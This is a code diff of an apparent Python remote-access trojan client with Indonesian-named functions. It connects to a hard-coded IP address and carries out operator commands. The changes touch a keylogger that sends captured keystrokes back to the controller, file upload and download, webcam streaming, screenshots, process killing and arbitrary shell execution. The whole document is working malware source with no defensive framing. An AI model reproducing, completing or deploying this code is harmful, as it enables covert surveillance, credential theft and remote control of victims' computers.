@@ -15,14 +15,32 @@ import pickle
 import struct
 import pyautogui
 import shutil
-import pyaudio
+import pyaudio 
 from pynput.keyboard import Key, Controller
 from mss import mss
 import numpy as np
 import ctypes
+from filetarget import download_file, upload_file
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ip = '192.168.18.198'
+main_log1 = threading.Event()
+
+def start_log():
+    Keylogger().start_log()
+    main_log1.set()
+
+def baca_log():
+    if not main_log1.is_set():
+        return
+
+    open()
+
+def stop_log():
+    Keylogger().stop_listener()
+
+def open():
+    sok.sendall(Keylogger().baca_log().encode())
 
 def change_directory(cmd):
     try:
@@ -57,24 +75,11 @@ def pidkill(cmd):
     except:
         return
 
-def getpid():
-    status = os.getpid()
-    stat = f"{status}"
-    sok.sendall(stat.encode())
-
 def check_priv():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
-
-def send_status_priv():
-    status = check_priv()
-    if status:
-        status = "You are admin"
-    else:
-        status = "You are users"
-    sok.sendall(status.encode())
 
 def send_camera_image(ip, port=9999):
     cap = cv2.VideoCapture(0)
@@ -205,45 +210,6 @@ def byte_stream():
     vid.release()
     cv2.destroyAllWindows()
 
-def open_log():
-    sok.send(Keylogger().baca_log().encode())
-
-def log_thread():
-    t = threading.Thread(target=open_log)
-    t.start()
-
-def download_file(namafile):
-    bufsize = 65536
-    size_data = sok.recv(8)
-    filesize = struct.unpack("Q", size_data)[0]
-    if filesize == 0:
-        return
-    recv = 0
-    with open(namafile, 'wb') as file:
-        while recv < filesize:
-                data = sok.recv(bufsize)
-                if not data:
-                    break
-                file.write(data)
-                recv += len(data)
-
-def upload_file(namafile):
-    bufsize = 65536
-    if not os.path.exists(namafile):
-        sok.sendall(struct.pack("Q", 0))
-        return
-    if os.path.isdir(namafile):
-        sok.sendall(struct.pack("Q", 1))
-        return
-    filesize = os.path.getsize(namafile)
-    sok.sendall(struct.pack("Q", filesize))
-    with open(namafile, 'rb') as f:
-        while True:
-            data = f.read(bufsize)
-            if not data:
-                break
-            sok.sendall(data)
-
 def terima_perintah():
     data = ''
     while True:
@@ -256,40 +222,27 @@ def terima_perintah():
             continue
 
 def jalankan_perintah():
-    main_keylogger = False
     while True:
         perintah = terima_perintah()
-        if perintah == ('exit', 'quit'):
+        if perintah in ('exit', 'quit'):
+            os.remove('baca_log.txt')
             break
         if perintah == 'clear':
             pass
         elif perintah[:3] == 'cd ':
             change_directory(perintah[3:])
         elif perintah[:8] == 'download':
-            upload_file(perintah[9:])
+            upload_file(sok, perintah[9:])
         elif perintah[:6] == 'upload':
-            download_file(perintah[7:])
+            download_file(sok, perintah[7:])
         elif perintah == 'start_log':
-            main_keylogger = True
-            if main_keylogger:
-                Keylogger().start_log()
-            else:
-                pass
+            start_log()
         elif perintah == 'baca_log':
-            if main_keylogger:
-                log_thread()
-            else:
-                pass
-        elif perintah == 'clear_log':
-            if main_keylogger:
-                Keylogger().clear_log()
-            else:
-                pass
+            baca_log()
         elif perintah == 'stop_log':
-            if not main_keylogger:
-                pass
-            else:
-                Keylogger().stop_listener()
+            stop_log()
+            stop_log()
+            main_log1.clear()
         elif perintah == 'start_cam':
             byte_stream()
         elif perintah == 'screen_shot':
@@ -313,10 +266,6 @@ def jalankan_perintah():
             kill(perintah[5:])
         elif perintah[:7] == 'pidkill':
             pidkill(perintah[8:])
-        elif perintah == 'getuid':
-            send_status_priv()
-        elif perintah == 'getpid':
-            getpid()
         else:
             exe = subprocess.Popen(
             perintah,
